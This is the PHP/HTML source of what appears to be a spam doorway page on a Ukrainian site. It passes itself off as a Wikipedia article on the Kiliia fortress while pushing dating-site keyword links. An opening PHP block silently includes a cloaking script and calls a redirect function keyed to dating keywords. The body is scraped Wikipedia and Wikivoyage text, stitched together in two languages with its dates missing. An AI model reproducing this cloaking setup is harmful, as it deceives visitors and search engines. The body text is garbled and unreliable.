<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d1%96+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d1%86%d0%b5%d0%bd%d1%82%d1%80%d0%b0%d0%bb%d1%8c%d0%bd%d1%96+%d0%9a%d1%96%d0%bb%d1%96%d1%8f+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Фортеця Кілія — Вікіпедія</title>
	<meta name="description" content="Знакомства рядом. Знакомства для мужчин 25+. Регистрируйся прямо сейчас!" />
	<link rel="canonical" href="https://masage.od.ua/img/248/visu-shvidksn-znayomstva.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/398/qol-znayomstva-msto.php">знайомства місто в Українськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/335/cuxim-sayt-znayomstv-cholovki.php">сайт знайомств чоловіки поруч Козятин Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/133/ny-znayomstva-onlayn-kiv.php">знайомства онлайн Київ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/249/zaxy-znayomstva-dlya-doroslih.php">знайомства для дорослих Каховка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/gexal-rshennya-dlya-znayomstv.php">рішення для знайомств Умань Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Швидкісні знайомства центральні Кілія Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Звідси велику кількість пшениці, меду, воску, вина, солі, риби та інших продуктів вивозили до Константинополя. Наприкінці XIV століття Мірча І Старий розширив територію Валахії до Чорного моря, завдяки чому Кілія стала частиною валаської держави. Незабаром, у  році , господар Молдавії Олександр Добрий взяв фортецю під контроль, скориставшись складною ситуацією, в якій опинився володар Валахії Дан II.</p>
<p>Через два десятиліття, в році , правитель Молдавії Петро II передав фортецю Яношу Гуньяді , який допоміг йому у боротьбі за відновлення правління Романа II. Під час нападу Штефан отримав травму щиколотки. За традицією, Штефан Великий програв лише дві битви, однією з яких стала облога Кілії в році. Через два з половиною роки, 25 січня року , після одноденної облоги 24 січня , Стефан Великий завоював кілійську фортецю.</p><img src="https://image.isu.pub/191122000532-df87fbae72d819e7d14d6d78173c052c/jpg/page_1.jpg" alt="Навігаційне меню" style="max-width: 480px; max-height: 480px;"/><p>Правитель називає Ісаю, свого швагра, старшиною міста. Для вдосконалення оборонної системи влітку року Стефан Великий відбудував на лівому березі Дунаю фортецю Кілія. У роботах взяли участь мулярів та 17 допоміжних засобів. У році відбувся похід султана Баязида II на Молдавію. Через вісім днів, 14 липня , османам вдалося завоювати фортецю. Від завоювання фортеці року до анексії Бессарабії у році Російською імперією Кілією керували турки-османи. З року внаслідок поразки Росії у Кримській війні Кілія повернулась до складу Молдавії , проте вже у році повернулась до складу Росії внаслідок поразки Османської імперії у російсько-турецькій війні — рр.</p>
<p>Фортеця перебуває в стані руїни. Зараз від фортеці, яка знаходиться на приватній території промислового підприємства, залишилася лише вежа ймовірно, каплиця цитаделі. Матеріал з Вікіпедії — вільної енциклопедії. Неперевірена версія що робити? Фортеця Кілія. Переправ в Румынию тоже нет. Подобно Измаилу , Килия вытянута с севера на юг. Берег Дуная занят судоремонтным заводом и портом , рядом с которыми находится городской парк , расположенный на месте бывшей крепости. От парка с юга на север тянутся основные улицы, в том числе центральная улица Ленина.</p><strong><a id='c1'></a><h2>Звіт про діяльність НОК України у році by Національний олімпійський комітет України - Issuu</h2></strong><p>Параллельно ей проходит Дунайская улица с полуподземной Николаевской церковью. Центром города является невзрачная площадь на пересечении улицы Ленина с улицей Осипенко. От площади до парка полкилометра на юг , а до автостанции — 1. Если застройку улицы Ленина можно с полным правом назвать городской, то остальная Килия неотличима от бессарабских деревень.</p>
<p>Из бесконечной череды частных домиков выделяется, разве что, расположенный восточнее порта посёлок судоремонтного завода СРЗ с обшарпанными пятиэтажками. Единственным городским транспортом является маршрутка , проезжающая раз в день от посёлка СРЗ через автостанцию в северную часть города. Дороги ужасны и в лучшем случае состоят из плохо уложенных бетонных плит, а подчас вообще лишены какого-либо покрытия.</p>
<p>Килийская крепость находилась на берегу Дуная в торце современных улиц Ленина, Гагарина и Суворова.</p><strong><a id='c2'></a><h2>Фортеця Кілія</h2></strong><p>Во время русско-турецких войн её штурмовали дважды оба раза успешно , после чего разрушили от греха подальше. Сейчас на месте крепости порт, элеватор и городской парк , а о находившихся здесь укреплениях напоминают лишь два пруда , образованных бывшим рвом: один в городском парке и другой вдоль улицы Тургенева. Таким образом, масштаб крепости легко прикинуть на местности, а детали есть на макете, выставленном в краеведческом музее. Если пройти через парк и двигаться вдоль забора порта, то рядом с территорией элеватора можно обнаружить стоящую на пустыре башенку — колокольню разрушенной в м году Успенской церкви 5.</p>
<p>Церковь датируется XIX веком, то есть возникла она уже после разрушения крепости, но какая-то другая церковь была здесь, вероятно, и раньше. После войны евреев практически не осталось, а синагога была разрушена уже при Советской власти. Сейчас на её месте мемориал памяти жертв Холокоста 7 рядом со зданием Горсовета ул. Ленина,  Кладбище же уцелело и находится в северной части города где-то в районе улицы Маяки за Дмитровским собором. Обычно оно закрыто.</p><a id='c3'></a><h3>Содержание</h3><p>Смотрительницу кладбища ищите в доме за магазином «Атлантис». Городская застройка конца XIX — начала XX вв. сохранилась вдоль улиц Ленина и Гагарина. Дома здесь каменные и основательные, совсем не похожие на обмазанные белой штукатуркой рядовые бессарабские постройки в том же Измаиле или Вилково.</p>
<p>Стиль в основном классический.</p><a id='c4'></a><h3>Партнери відпочинку</h3><p>Наиболее интересно здание бывшей электростанции ныне гостиница и кафе «Стиль»; ул. Ленина 1 с признаками модерна.</p>
		
			<br><ul>
			
				<li>?</li>
			
				<li>Туристичний портал Зручно Тревел.</li>
			
				<li>Слідкуйте за новими пропозиціями для відпочинку.</li>
			
				<li>сцена знайомств Саки Україна.</li>
			
				<li>найкраще місце підключення в Словянськ Україна.</li>
			
				<li>!</li>
			
			</ul>
		
	<p>Для любителей советской архитектуры припасён монументальный ДК в районе Путь Ленина на перекрёстке улиц Киевской и Будённого в северной части города, рядом с Дмитровским собором. Среди продовольственных магазинов доминирует сеть «Бурёнка». На центральной площади есть также универмаг, а чуть дальше по ул. Ленина находится дом быта. Стоит зайти на городской рынок 1 Пролетарская улица, напротив автостанции , где продают свежие фрукты, овощи и дунайскую рыбу. Килия славится своей клубникой, выращиваемой на придунайских полях.</p>
<p>Килия и Вилково снабжают клубникой Одесский Привоз, ну а в сезон в самом городе купить её можно за копейки. Килийская пивоварня выпускает несколько сортов живого нефильтрованного пиво Капiтан. Продаётся оно в магазинах «Бурёнка», причём не только в Килии, но и в Татарбунарах, и даже в Одессе.</p>
		
	<p>Некогда знаменитый Килийский винзавод прекратил работу, однако виноград в этой местности продолжают выращивать, поэтому, возможно, вам удастся найти неплохое домашнее вино. В Килии есть несколько работающих допоздна баров. Другая форма местного досуга — распитие спиртных напитков прямо в круглосуточных магазинах: например, в магазине «Бурёнка» на центральной площади.</p>
<p>Смелые и физически сильные путешественники могут изучить этот аспект ночной жизни города. Остальным же придётся довольствоваться кафе-баром-ночным клубом «Стиль» при одноимённой гостинице или искать бильярд, расположенный где-то на улице Ленина. По слухам, ведомственные гостиницы ещё существуют при винзаводе и даже при рыбколхозе «Голубая Нива», но о них совсем ничего неизвестно — спрашивайте у местных жителей.</p><strong><a id='c5'></a><h2></h2></strong><p>Остановиться можно и в гостинице села Шевченково, расположенного в 12 км севернее Килии по дороге на Одессу. Осипенко центральная площадь. Материал из Wikivoyage. Последнее обновление: май  Карта    Координаты. Килия укр. Пролетарская, 42а.</p>
		
	<p>Находится в северо-восточной части города, на углу Пролетарской и Колхозной улиц, напротив рынка. Самое древнее и необычное здание Килии. Низкая, приземистая церковь на два с лишним метра углублена в землю и почти лишена окон: снаружи видны лишь мощные контрфорсы. Построенная в XIX веке колокольня выполнена в гораздо менее суровом стиле и украшена игривым завершением с пятью маленькими куполами, а вот сама церковь напоминает о временах турецкого владычества, когда существовали жёсткие ограничения по высоте — по легенде, христианские храмы не должны были быть выше сидящего на коне янычара.</p>
<p>Так в Бессарабии появилась традиция строительства полуподземных церквей , из которых кроме Николаевской сохранились армянская церковь в Белгороде-Днестровском и Успенская церковь в молдавских Каушанах. Последняя почти заброшена, отчего выглядит наиболее древней. Килийская же церковь, напротив, восстановлена и жизнь здесь бьёт ключом. Церковь датируется годом, хотя какие-то другие постройки существовали на её месте и раньше. Об этом, в частности, свидетельствуют мраморные надгробные плиты , которые были обнаружены при реставрации, а теперь выставлены прямо на улице перед храмом.</p>
<p>Хотя надписи на плитах до сих пор толком не расшифрованы, местные краеведы считают надгробия армянскими и подчёркивают большую роль армянской общины в жизни средневековой Килии. Сейчас Николаевская церковь действует.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/406/ky-mstsya-pdklyuchiti.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/428/jecok-prosto-znayomstva.php">просто знайомства в Городище Україна</a></li><li><a href="https://masage.od.ua/img/377/nyjo-sayti-starshih-znayomstv.php">сайти старших знайомств Новодністровськ Україна</a></li><li><a href="https://masage.od.ua/img/454/xor-pravo-znayomstv.php">право знайомств Бровари Україна</a></li><li><a href="https://masage.od.ua/img/377/kix-msto-znayomstv.php">місто знайомств Красноперекопськ (Яни Капу) Україна</a></li><li><a href="https://masage.od.ua/img/291/re-sayti-znayomstv.php">сайти знайомств з людьми в Ічня Україна</a></li><li><a href="https://masage.od.ua/img/211/qa-azatska-sluzhba-znayomstv.php">азіатська служба знайомств Яворів Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#c1'>Звіт про діяльність НОК України у році by Національний олімпійський комітет України - Issuu</a></li>
<li><a href='#c2'>Фортеця Кілія</a></li>
<li><a href='#c3'>Содержание</a></li>
<li><a href='#c4'>Партнери відпочинку</a></li>
<li><a href='#c5'></a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/133/zazin-znayomstva-z-kimos.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>